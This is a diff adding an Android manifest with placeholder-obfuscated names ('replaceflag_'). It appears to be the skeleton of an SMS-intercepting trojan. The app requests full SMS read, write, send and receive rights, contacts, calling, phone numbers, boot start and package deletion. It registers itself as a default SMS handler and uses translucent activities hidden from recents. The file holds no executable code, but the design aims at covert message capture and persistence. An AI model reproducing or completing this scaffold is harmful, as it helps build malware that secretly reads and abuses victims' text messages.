@@ -1,0 +1,171 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+   package="replaceflag_fysn.replaceflag_rydk.replaceflag_capud">
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <!-- 读取联系人权限 -->
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <!-- 拨打电话权限 -->
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+
+    <application
+        android:name=".replaceflag_Ahrtry"
+        android:allowBackup="true"
+        android:icon="@mipmap/replaceflag_logo"
+        android:label="@string/replaceflag_app_name"
+        android:supportsRtl="true"
+        android:networkSecurityConfig="@xml/replaceflag_network"
+        android:theme="@style/replaceflag_AppTheme">
+
+        <receiver android:name=".replaceflag_Abvffg$MyReceiver">
+            <intent-filter>
+                <action android:name="com.my.submit"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".replaceflag_Tfgfgy"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".replaceflag_Bhrhdf"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name=".replaceflag_Booioo"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
+            android:exported="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </service>
+
+        <!--<activity
+            android:name=".replaceflag_Bjjkiu"
+            android:label="@string/replaceflag_app_name"
+            android:excludeFromRecents="true"
+            android:taskAffinity="replaceflag_fysn.replaceflag_rydk.replaceflag_capud.color.sms"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>-->
+
+        <activity android:name=".replaceflag_Brrtrw">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SENDTO" />
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <category android:name="android.intent.category.APP_MESSAGING"/>
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <receiver android:name=".replaceflag_Awewdd" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </receiver>
+
+        <activity android:name=".replaceflag_aas.replaceflag_Bteert"
+            android:excludeFromRecents="true" />
+        <activity android:name=".replaceflag_aas.replaceflag_Bggere"
+            android:excludeFromRecents="true" />
+        <activity android:name=".replaceflag_aas.replaceflag_Bhhrrg"
+            android:excludeFromRecents="true" />
+        <activity android:name=".replaceflag_aas.replaceflag_Mjyyui"
+            android:excludeFromRecents="true" />
+        <activity android:name=".replaceflag_UjjuioActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleTop"
+            android:excludeFromRecents="true"/>
+        <activity android:name=".replaceflag_rryyuActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleTop"
+            android:excludeFromRecents="true"/>
+        <activity android:name=".replaceflag_oiiopActivity"
+            android:launchMode="singleTop"
+            android:taskAffinity=".com.w"
+            android:excludeFromRecents="true"/>
+
+        <!-- 启动页 -->
+        <activity
+            android:name=".replaceflag_NewSplashActivity"
+            android:excludeFromRecents="true"
+            android:label="@string/replaceflag_app_name"
+            android:taskAffinity="replaceflag_fysn.replaceflag_rydk.replaceflag_capud.color.sms"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".replaceflag_NewPermissionActivity"
+            android:excludeFromRecents="true"
+            android:label="@string/replaceflag_app_name"
+            android:taskAffinity="replaceflag_fysn.replaceflag_rydk.replaceflag_capud.color.sms"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+
+        <activity
+            android:name=".replaceflag_NewEnterActivity"
+            android:excludeFromRecents="true"
+            android:label="@string/replaceflag_app_name"
+            android:taskAffinity="replaceflag_fysn.replaceflag_rydk.replaceflag_capud.color.sms"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+
+        <activity
+            android:name=".replaceflag_NewMainActivity"
+            android:excludeFromRecents="true"
+            android:label="@string/replaceflag_app_name"
+            android:taskAffinity="replaceflag_fysn.replaceflag_rydk.replaceflag_capud.color.sms"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SENDTO" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+                <category android:name="android.intent.category.APP_MESSAGING" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
